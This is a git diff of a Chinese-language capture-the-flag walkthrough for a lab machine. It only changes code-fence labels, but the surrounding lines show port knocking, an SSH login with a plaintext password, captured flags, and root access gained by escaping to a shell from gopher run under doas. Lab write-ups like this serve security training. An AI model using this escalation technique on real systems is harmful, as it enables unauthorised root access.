@@ -55,7 +55,7 @@ Ping us to: 4767 2343 3142
 
 ## knock 芝麻开门
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ knock 192.168.56.125 4767 2343 3142
 ┌─[randark@parrot]─[~]
@@ -213,7 +213,7 @@ index index.html index.htm index.nginx-debian.html;
 
 ## User - susan
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ ssh susan@192.168.56.125
 (susan@192.168.56.125) Password: ** 8ycrois-tu0 **
@@ -239,7 +239,7 @@ susan
 
 ### flag - user
 
-```shell
+```bash
 susan@eighty:~$ cat user.txt
 hmv8use0red
 ```
@@ -269,7 +269,7 @@ permit nolog susan as root cmd gopher
 
 ## User - root
 
-```shell
+```bash
 susan@eighty:~$ doas -u root gopher localhost 70
 ```
 
@@ -279,14 +279,14 @@ susan@eighty:~$ doas -u root gopher localhost 70
 
 接下来，按下 `!` 键，即可进入 shell
 
-```shell
+```bash
 root@eighty:/home/susan# whoami
 root
 ```
 
 ### flag - root
 
-```shell
+```bash
 root@eighty:~# cat r0ot.txt
 rooted80shmv
 ```
